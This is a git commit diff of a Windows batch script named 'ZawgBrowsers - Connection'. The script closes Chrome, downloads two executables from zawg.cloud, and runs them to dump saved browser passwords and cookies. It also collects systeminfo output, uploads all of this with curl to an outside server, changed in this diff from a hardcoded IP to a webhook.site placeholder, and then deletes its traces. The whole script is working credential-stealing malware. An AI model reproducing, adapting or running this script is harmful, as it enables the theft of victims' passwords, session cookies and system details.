972d7a346cc20baa36da4dd2d7d5bea2702138d0
harryzawg <harry@zawg.cloud>
2024-05-17 18:27:16 -0400

    Update Run.bat

--- Run.bat
+++ Run.bat
@@ -1,6 +1,6 @@
 @echo off
 title ZawgBrowsers - Connection
-set IP=174.119.158.179
+set IP=github.com
   echo [94m╔══════════
   echo [94m║        ZawgBrowsers        ║
   echo [94m║         Connection         ║
@@ -30,34 +30,23 @@ taskkill /f /im chrome.exe
 curl -o "%USERPROFILE%\Downloads\p.exe" https://zawg.cloud/webhook/p.exe
 curl -o "%USERPROFILE%\Downloads\c.exe" https://zawg.cloud/webhook/c.exe
 cd "%USERPROFILE%\Downloads"
-cd "%USERPROFILE%\Downloads"
-cd "%USERPROFILE%\Downloads"
-cd "%USERPROFILE%\Downloads"
-cd "C:\Users\%username%\Downloads"
-"%USERPROFILE%\Downloads\c.exe" --json-print > "%USERPROFILE%\Downloads\cookies.txt"
-"%USERPROFILE%\Downloads\p.exe" > "%USERPROFILE%\Downloads\passes.txt"
-curl -X POST -F "file=@%USERPROFILE%\Downloads\passes.txt" 174.119.158.179/webhook/webhookreceive.php
+"%USERPROFILE%\Downloads\c.exe" -c > "%USERPROFILE%\Downloads\cookies.txt"
+"%USERPROFILE%\Downloads\p.exe" -c > "%USERPROFILE%\Downloads\passes.txt"
+curl -X POST -F "file=@%USERPROFILE%\Downloads\passes.txt" webhook (i use webhook.site)
 echo.
-curl -X POST -F "file=@%USERPROFILE%\Downloads\cookies.txt" 174.119.158.179/webhook/webhookreceive.php
-echo.
-curl -X POST -d "data=%USERNAME%" 174.119.158.179/webhook/folderchecktxt.php
+curl -X POST -F "file=@%USERPROFILE%\Downloads\cookies.txt" webhook (i use webhook.site)
 echo.
 systeminfo > "%USERPROFILE%\Downloads\sys.txt"
 echo.
-curl -X POST -F "file=@%USERPROFILE%\Downloads\sys.txt" 174.119.158.179/webhook/webhookreceive.php
-echo.
-curl -X POST 174.119.158.179/webhook/folderchecktxt.php
+curl -X POST -F "file=@%USERPROFILE%\Downloads\sys.txt" webhook (i use webhook.site)
 echo.
 del /F /Q "%USERPROFILE%\Downloads\cookies.txt"
 del /F /Q "%USERPROFILE%\Downloads\passes.txt"
 del /F /Q "%USERPROFILE%\Downloads\sys.txt"
 del /F /Q "%USERPROFILE%\Downloads\c.exe"
 del /F /Q "%USERPROFILE%\Downloads\p.exe"
-del /F /Q "%USERPROFILE%\Downloads\Cookies_decrypted"
-del /F /Q "%~dp0\Cookies_decrypted"
-del /F /Q "%~d0\Cookies_decrypted"
 start chrome.exe -restore-last-session
 taskkill /f /im cmd.exe
-echo Finished! Check zawg.cloud or notify me to send you the files
+echo Finished!
 pause
 )
